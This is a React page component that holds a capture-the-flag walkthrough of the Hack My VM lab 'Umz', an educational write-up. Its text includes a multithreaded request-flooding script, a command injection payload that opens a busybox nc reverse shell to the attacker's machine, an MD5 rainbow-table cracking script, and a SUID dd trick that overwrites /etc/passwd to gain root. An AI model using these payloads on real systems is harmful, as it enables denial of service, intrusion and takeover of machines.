import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaArrowLeft, FaCalendar, FaServer, FaStar, FaDesktop, FaNetworkWired, FaCopy, FaCheck } from 'react-icons/fa';
import TableOfContents from '../../../components/TableOfContents';
import ScrollToTop from '../../../components/ScrollToTop';
import DynamicSEO from '../../../components/DynamicSEO';
import './UmzWalkthrough.css';

const UmzWalkthrough = () => {
  const navigate = useNavigate();

  const CodeBlock = ({ language, children }) => {
    const [copied, setCopied] = useState(false);
    const handleCopy = async () => {
      try {
        await navigator.clipboard.writeText(children);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      } catch (err) {
        console.error('Failed to copy text: ', err);
      }
    };
    const displayLanguage = language === 'bash' ? 'Shell' : language;
    const showPrompt = language === 'bash' || language === 'shell';
    return (
      <div className="code-block-container">
        <div className="code-block-header">
          <span className="code-block-language">{displayLanguage || 'Terminal'}</span>
          <button className={'copy-button ' + (copied ? 'copied' : '')} onClick={handleCopy} title={copied ? 'Copied!' : 'Copy to clipboard'}>
            {copied ? <FaCheck /> : <FaCopy />}
          </button>
        </div>
        <pre>
          <code className={'terminal-code ' + (language ? 'language-' + language : '')}>
            {showPrompt && <span className="terminal-prompt">$ </span>}
            {children}
          </code>
        </pre>
      </div>
    );
  };

  const parseInlineMarkdown = (text) => {
    const parts = [];
    let lastIndex = 0;
    let key = 0;
    const regex = /(\[.*?\]\(.*?\)|\*\*.*?\*\*|\*.*?\*|`.*?`)/g;
    let match;
    while ((match = regex.exec(text)) !== null) {
      if (match.index > lastIndex) {
        parts.push(text.substring(lastIndex, match.index));
      }
      const matched = match[0];
      if (matched.startsWith('[') && matched.includes('](')) {
        const linkMatch = matched.match(/\[(.*?)\]\((.*?)\)/);
        if (linkMatch) {
          const [, linkText, linkUrl] = linkMatch;
          parts.push(<a key={key++} href={linkUrl} target="_blank" rel="noopener noreferrer" className="content-link">{linkText}</a>);
        }
      } else if (matched.startsWith('**') && matched.endsWith('**')) {
        parts.push(<strong key={key++}>{matched.slice(2, -2)}</strong>);
      } else if (matched.startsWith('*') && matched.endsWith('*')) {
        parts.push(<em key={key++}>{matched.slice(1, -1)}</em>);
      } else if (matched.startsWith('`') && matched.endsWith('`')) {
        parts.push(<code key={key++} className="inline-code">{matched.slice(1, -1)}</code>);
      }
      lastIndex = regex.lastIndex;
    }
    if (lastIndex < text.length) {
      parts.push(text.substring(lastIndex));
    }
    return parts.length > 0 ? parts : text;
  };

  const writeup = {
    id: 'umz-walkthrough',
    title: 'Umz Walkthrough',
    excerpt: 'Umz is an easy Hack My VM machine featuring a DDoS-triggered backend, OS command injection via a ping form, sudo md5sum for lateral movement, rainbow table for password recovery, and SUID dd for root.',
    date: 'Mar 05, 2026',
    tags: ['Hmv', 'Linux', 'DDOS', 'Command-Injection', 'Sudo_Md5sum', 'Rainbowlist', 'DD'],
    difficulty: 'Easy',
    os: 'Linux',
    ip: '192.168.0.12',
    content: `## Overview
Umz is an **easy** Linux machine from **Hack My VM** with an unusual entry path. The main web server is built to resist DDoS, and when overloaded it triggers a *security protocol* that brings up a hidden debug service on port 8080. From there, command injection in a ping utility leads to a reverse shell. Lateral movement comes from abusing \`sudo md5sum\` to read a root-only password file via its MD5 hash and a rainbow table, and privilege escalation is done by exploiting a SUID binary that wraps \`dd\` to overwrite \`/etc/passwd\` and gain root.

## Enumeration
### Finding the host
The host can be discovered with \`arp-scan\` on the local network.
\`\`\`bash
sudo arp-scan -l
\`\`\`

\`\`\`bash
sudo nmap -vv -sS -sV -sC -p- --min-rate=10000 192.168.0.13 -oN nmap/log.nmap

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
|_http-title: cyber fortress 9000
| http-methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:13:EE:44 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\`\`\`

Some important open ports show up. **Port 22** runs OpenSSH 8.4p1. **Port 80** runs Apache 2.4.62 with a web app titled "cyber fortress 9000", marketed as DDoS-resistant.

### Service Enumeration
On port 80 the site presents itself as resistant to DDoS.
![Website resisting DDOS](/images/writeups/umz/1.png)

Directory and file fuzzing does not reveal much. the important clue is that **when this web server is overloaded, security protocols are triggered** and another service is brought online.
\`\`\`bash
ffuf -u "http://192.168.0.13/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100 -c -e .txt,.html,.php
\`\`\`
![Fuzzing results](/images/writeups/umz/2.png)

The page at \`/index.php\` is a **Resource Stress Test Interface**. A red banner states that **DDoS Protection** is active and that excessive requests will trigger security protocols. The interface shows system status and prime number generation, so the app is built to react to load. Once the server receives enough concurrent requests, the application reports that security protocols have been activated. In response, a hidden service is brought online and a new port opens on the target.
![Security protocols message](/images/writeups/umz/3.png)

## Foothold
### DDoS script
A Python script sends continuous GET requests with multiple threads. Running it in several terminals increases the load until the “security protocol” kicks in and the backend exposes the debug interface.
\`\`\`python
import requests
import threading
import time
import signal

TARGET_URL = "http://192.168.0.13/index.php"
THREADS = 50
DELAY = 0
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "*/*"}
stop_flag = False

def signal_handler(sig, frame):
    global stop_flag
    stop_flag = True
signal.signal(signal.SIGINT, signal_handler)

def attack_loop():
    while not stop_flag:
        try:
            r = requests.get(TARGET_URL, headers=HEADERS, timeout=3)
            print(f"[{r.status_code}] {len(r.text)} bytes")
        except Exception as e:
            print(f"[!] {e}")
        time.sleep(DELAY)

for _ in range(THREADS):
    t = threading.Thread(target=attack_loop, daemon=True)
    t.start()
while not stop_flag:
    time.sleep(0.5)
\`\`\`
![DDoS script in 4 terminals](/images/writeups/umz/4.png)

After triggering the "security protocol", nmap is run again. **Port 8080** is then open and The console at \`login\` accepts default credentials **admin:admin**.
![Admin login](/images/writeups/umz/5.png)

### Command injection via ping
Inside the console, a feature runs the system \`ping\` binary with user-controlled input. It is vulnerable to **OS command injection**. \`busybox nc\` can send a reverse shell back to the attack machine while it listens with \`nc -lvnp 1337\`.
![Ping execution page](/images/writeups/umz/6.png)
![Command injection](/images/writeups/umz/7.png)

### User flag
Getting a reverse shell as **www-data** and retrieving the user flag:
\`\`\`bash
127.0.0.1;busybox nc 192.168.0.8 1337 -e /bin/bash
\`\`\`
![Reverse shell and user flag](/images/writeups/umz/8.png)

## Post Exploitation
### Lateral Movement - sudo md5sum
Running \`sudo -l\` shows that the current user can run **\`md5sum\` as root** without a password. The file \`umz.pass\` is owned by root and cannot be read directly, but \`sudo md5sum\` still reveals the **MD5 hash** of its contents, which is the password for \`umzyyds\`.
![Sudo md5sum](/images/writeups/umz/9.png)
![umz.pass file](/images/writeups/umz/10.png)

### Rainbow table and password recovery
The wordlist \`rockyou.txt\` is filtered to words of a given length so the rainbow table stays manageable. The first command below writes only 9-character lines to \`small.txt\`.
\`\`\`bash
cat /usr/share/wordlists/rockyou.txt | awk 'length($0)==9' > small.txt
\`\`\`

A small script builds the **rainbow table**: it reads each word from the wordlist, computes its MD5 hash, and writes one line per pair \`hash word\` to the output file. Later, the target hash can be looked up in that file to recover the plaintext password.
\`\`\`python
#!/usr/bin/env python3
import hashlib
import sys

def gerar_rainbow_md5(wordlist_path, output_path):
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f_in, \\
         open(output_path, 'w', encoding='utf-8') as f_out:
        for linha in f_in:
            palavra = linha.strip()
            if not palavra: continue
            hash_md5 = hashlib.md5(palavra.encode()).hexdigest()
            f_out.write(f"{hash_md5} {palavra}\\n")
    print(f"[✔] Rainbow wordlist salva em: {output_path}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python3 gera_rainbow_md5.py wordlist.txt output.txt")
        sys.exit(1)
    gerar_rainbow_md5(sys.argv[1], sys.argv[2])
\`\`\`

The script is run with \`small.txt\` as input and \`rainbowlist.txt\` as output. Then \`grep\` is used on the hash obtained from \`sudo md5sum umz.pass\` to find the matching line and thus the password for \`umzyyds\`.
\`\`\`bash
python3 gera_rainbow_md5.py small.txt rainbowlist.txt
cat rainbowlist.txt | grep a963fadd7fd379f9bc294ad0ba44f659
\`\`\`
![Rainbow list grep result](/images/writeups/umz/11.png)

With the recovered password, \`su umzyyds\` switches to that user.
## Privilege Escalation - SUID binary (Dashazi)
In umzyyds’s environment a custom binary (\`Dashazi\`) is found with **SUID** set and owned by root. It wraps the \`dd\` command: it reads from stdin and writes to a user-chosen output file. Since it runs as root, that output can be \`/etc/passwd\`, so a new line is written that defines a user with UID 0 and a known password hash.
![Binary found](/images/writeups/umz/12.png)
![Binary details](/images/writeups/umz/13.png)
![SUID binary](/images/writeups/umz/14.png)

### Root flag
A password hash is generated with \`openssl passwd\` and a \`passwd\` line is crafted and fed to the binary that overwrites  \`/etc/passwd\`.
\`\`\`bash
openssl passwd "voldemort"
echo 'v01:$1$JzgiDAwI$L7eEAw3j1XsKlzLs7BE9K1:0:0:xxoo,,,:/root:/bin/bash' | ./Dashazi of=/etc/passwd
su v01
\`\`\`
![dd help](/images/writeups/umz/15.png)
![dd usage](/images/writeups/umz/16.png)
![Passwd overwrite](/images/writeups/umz/17.png)
![Root flag](/images/writeups/umz/18.png)

## Conclusion
Umz is an easy Linux machine that demonstrates an unusual entry path: triggering a hidden debug service by overloading the web server, then command injection, lateral movement via \`sudo md5sum\` and a rainbow table, and privilege escalation through a SUID binary that wraps \`dd\`.

The attack path involved:

• **Recon**: Discovering the host with \`arp-scan\` and enumerating ports with Nmap (SSH on 22, Apache on 80)
• **Enumeration**: Identifying the Resource Stress Test Interface and the hint that excessive requests trigger security protocols and bring a hidden service online
• **Foothold**: Running a Python script to stress the server until port 8080 opens, logging into the Debug Console with \`admin:admin\`, and exploiting command injection in the ping feature to obtain a reverse shell and the user flag
• **Lateral Movement**: Using \`sudo md5sum\` on the root-owned \`umz.pass\` to get its MD5 hash, building a rainbow table from a filtered wordlist, and recovering the \`umzyyds\` password to switch users
• **Privilege Escalation**: Abusing the SUID \`Dashazi\` binary (a \`dd\` wrapper) to overwrite \`/etc/passwd\` with a new root-equivalent user and capturing the root flag

**Tools Used**: Nmap, arp-scan, ffuf, Python (requests, threading), Netcat, OpenSSL, custom rainbow-table script

The machine highlights the risks of exposing debug interfaces under load, passing user input to system commands, allowing \`sudo\` on hashing tools to read arbitrary files, and leaving SUID binaries that write to sensitive paths.`
  };

  return (
    <>
      <DynamicSEO
        type="writeup"
        data={{
          title: writeup.title,
          excerpt: writeup.excerpt,
          id: writeup.id,
          image_url: '/images/writeups/umz/machine.png',
          os_type: writeup.os,
          difficulty: writeup.difficulty,
          tags: writeup.tags
        }}
      />
      <motion.div
        className="writeup-detail-page"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
      >
        <div className="writeup-header">
          <Link to="/writeups" className="back-button">
            <FaArrowLeft />
            <span>Back to Writeups</span>
          </Link>
        </div>

        <motion.div
          className="writeup-title-section"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2, duration: 0.6 }}
        >
          <h1 id="writeup-title">{writeup.title}</h1>

          <div className="writeup-meta">
            <div className="meta-item">
              <FaCalendar />
              <span>{writeup.date}</span>
            </div>
          </div>

          <div className="writeup-tags">
            {writeup.tags.map((tag, index) => (
              <motion.span
                key={tag}
                className="tag-badge"
                initial={{ scale: 0, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}
                whileHover={{ scale: 1.1 }}
                style={{ cursor: 'pointer' }}
                onClick={() => navigate(`/tags/${String(tag).toLowerCase()}`)}
              >
                {tag}
              </motion.span>
            ))}
          </div>

          <div className="machine-info">
            <div className="machine-info-content">
              <div className="machine-info-left">
                <h6><FaServer /> Machine Information:</h6>
                <div className="machine-info-vertical">
                  <div className="info-item">
                    <FaDesktop /> OS:
                    <img
                      src={`/os-icons/${writeup.os}.png`}
                      alt={`${writeup.os} Icon`}
                      className="os-icon"
                      onError={(e) => {
                        e.target.style.display = 'none';
                        if (e.target.nextSibling) e.target.nextSibling.style.display = 'inline';
                      }}
                    />
                  </div>
                  <div className="info-item">
                    <FaStar /> Difficulty: {writeup.difficulty}
                  </div>
                  <div className="info-item">
                    <FaNetworkWired /> IP: {writeup.ip}
                  </div>
                </div>
              </div>
              <div className="machine-info-right">
                <img src="/images/writeups/umz/machine.png" alt="Umz" className="machine-image" />
              </div>
            </div>
          </div>

          <div className="markdown-content">
            {(() => {
              const lines = writeup.content.split('\n');
              const elements = [];
              let i = 0;

              while (i < lines.length) {
                const line = lines[i];

                if (line.startsWith('# ')) {
                  elements.push(<h1 key={i}>{parseInlineMarkdown(line.substring(2))}</h1>);
                } else if (line.startsWith('## ')) {
                  elements.push(<h2 key={i}>{parseInlineMarkdown(line.substring(3))}</h2>);
                } else if (line.startsWith('### ')) {
                  elements.push(<h3 key={i}>{parseInlineMarkdown(line.substring(4))}</h3>);
                } else if (line.startsWith('```')) {
                  const language = line.substring(3).trim();
                  const codeLines = [];
                  i++;
                  while (i < lines.length && !lines[i].startsWith('```')) {
                    codeLines.push(lines[i]);
                    i++;
                  }
                  elements.push(
                    <CodeBlock key={i} language={language}>
                      {codeLines.join('\n')}
                    </CodeBlock>
                  );
                } else if (line.startsWith('![')) {
                  const match = line.match(/!\[(.*?)\]\((.*?)\)/);
                  if (match) {
                    const [, alt, src] = match;
                    elements.push(
                      <div key={i} className="image-container">
                        <img src={src} alt={alt} className="content-image" />
                      </div>
                    );
                  }
                } else if (line.trim()) {
                  elements.push(<p key={i}>{parseInlineMarkdown(line)}</p>);
                } else {
                  elements.push(<br key={i} />);
                }

                i++;
              }

              return elements;
            })()}
          </div>
        </motion.div>

        <TableOfContents content={writeup.content} title={writeup.title} />
        <ScrollToTop />
      </motion.div>
    </>
  );
};

export default UmzWalkthrough;
